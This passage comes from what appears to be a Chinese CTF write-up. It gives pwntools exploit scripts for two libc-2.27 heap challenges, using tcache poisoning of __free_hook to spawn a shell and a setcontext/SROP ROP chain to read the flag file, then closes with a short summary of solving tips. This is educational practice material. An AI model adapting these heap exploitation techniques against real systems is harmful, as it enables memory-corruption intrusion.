        add(0x100, '\x60')
        add(0x100, '\x60')
        add(0x100, '\x60')
        delete(1)
        show(1)
        libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x3ebca0)
        libc.address = libc_base
        add(0x100, p64(libc.sym['__free_hook']))
        add(0x100, p64(libc.sym['system']))
        add(0x100, p64(libc.sym['system']))
        delete(2)
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
###  MynoteMax
    from pwn import *
    elf = None
    libc = None
    file_name = "./Mynote_Max"
    # context.timeout = 1
    def get_file(dic=""):
        context.binary = dic + file_name
        return context.binary
    def get_libc(dic=""):
        libc = None
        try:
            data = os.popen("ldd {}".format(dic + file_name)).read()
            for i in data.split('\n'):
                libc_info = i.split("=>")
                if len(libc_info) == 2:
                    if "libc" in libc_info[0]:
                        libc_path = libc_info[1].split(' (')
                        if len(libc_path) == 2:
                            libc = ELF(libc_path[0].replace(' ', ''), checksec=False)
                            return libc
        except:
            pass
        if context.arch == 'amd64':
            libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
        elif context.arch == 'i386':
            try:
                libc = ELF("/lib/i386-linux-gnu/libc.so.6", checksec=False)
            except:
                libc = ELF("/lib32/libc.so.6", checksec=False)
        return libc
    def get_sh(Use_other_libc=False, Use_ssh=False):
        global libc
        if args['REMOTE']:
            if Use_other_libc:
                libc = ELF("./libc.so.6", checksec=False)
            if Use_ssh:
                s = ssh(sys.argv[3], sys.argv[1], sys.argv[2], sys.argv[4])
                return s.process(file_name)
            else:
                return remote(sys.argv[1], sys.argv[2])
        else:
            return process(file_name)
    def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                    int_mode=False):
        if start_string != None:
            sh.recvuntil(start_string)
        if libc == True:
            return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
        elif int_mode:
            return_address = int(sh.recvuntil(end_string, drop=True), 16)
        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    def get_gdb(sh, gdbscript=None, addr=0, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript=gdbscript)
        elif addr is not None:
            text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(sh.pid)).readlines()[1], 16)
            log.success("breakpoint_addr --> " + hex(text_base + addr))
            gdb.attach(sh, 'b *{}'.format(hex(text_base + addr)))
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, sh=None, elf=None, libc=None):
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count  Your choice :", str(idx))
    def add(size, content='sh\x00'):
        choice(1)
        sh.sendlineafter("size :", str(size))
        sh.sendafter("Content :", content)
    def show(idx):
        choice(2)
        sh.sendlineafter("Index :", str(idx))
    def delete(idx):
        choice(3)
        sh.sendlineafter("Index :", str(idx))
    def pwn(sh, elf, libc):
        print libc.path
        context.log_level = "debug"
        add(0x200)  # 0
        add(0x200)  # 1
        add(0x200)  # 2
        delete(0)
        delete(0)
        show(0)
        sh.recvuntil('Content: ')
        heap_addr = u64(sh.recvuntil('\x2b', drop=True)[-6:].ljust(8, '\x00'))
        log.success("heap_base:\t" + hex(heap_addr - 0x260))
        add(0x200, '\x60')  # 0
        add(0x200, '\x60')  # 3
        add(0x200, '\x60')  # 4
        delete(1)
        show(1)
        libc_base = get_address(sh, True, info="libc_base:\t", offset=-0x3ebca0)
        libc.address = libc_base
        # SROP
        pop_rdi_addr = libc_base + 0x2155f
        pop_rsi_addr = libc_base + 0x23e6a
        pop_rdx_addr = libc_base + 0x1b96
        pop_rax_addr = libc_base + 0x439c8
        syscall_ret_addr = libc_base + 0xd2975
        fake_frame_addr = heap_addr
        frame = SigreturnFrame()
        frame.rax = 2
        frame.rdi = fake_frame_addr + 0xF8
        frame.rsi = 0
        frame.rdx = 0x100
        frame.rsp = fake_frame_addr + 0xF8 + 0x10
        frame.rip = pop_rdi_addr + 1  # : ret
        rop_data = [
            pop_rax_addr,  # sys_open('flag', 0)
            2,
            syscall_ret_addr,
            pop_rax_addr,  # sys_read(flag_fd, heap, 0x100)
            0,
            pop_rdi_addr,
            3,
            pop_rsi_addr,
            fake_frame_addr + 0x200,
            syscall_ret_addr,
            pop_rax_addr,  # sys_write(1, heap, 0x100)
            1,
            pop_rdi_addr,
            1,
            pop_rsi_addr,
            fake_frame_addr + 0x200,
            syscall_ret_addr
        ]
        add(0x200, p64(libc.sym['__free_hook']))  # 5
        add(0x200, str(frame).ljust(0xF8, '\x00') + 'flag' + '\x00' * (8 + 4) + flat(rop_data))  # 6
        add(0x200, p64(libc.sym['setcontext'] + 53))  # 7
        #gdb.attach(sh, "b *" + hex(libc.sym['setcontext'] + 53))
        delete(0)
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(sh=sh, elf=get_file(), libc=get_libc())
        sh.close()
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
## 总结
这次的公开赛的题目只能算是一个常规的堆题吧，对于新手入门 libc2.27
还是有很大的帮助的。所以本文的主要目的也不是在于介绍这道题上，而是借用这些题目为引，来简单的说说我做题的思路以及会遇到的一些坑，这些坑虽然看上去平平无奇，但在实际比赛中遇到总是会给人带来一丝紧张。如果提前了解了，那么在比赛过程中就是“知己知彼，百战不殆”。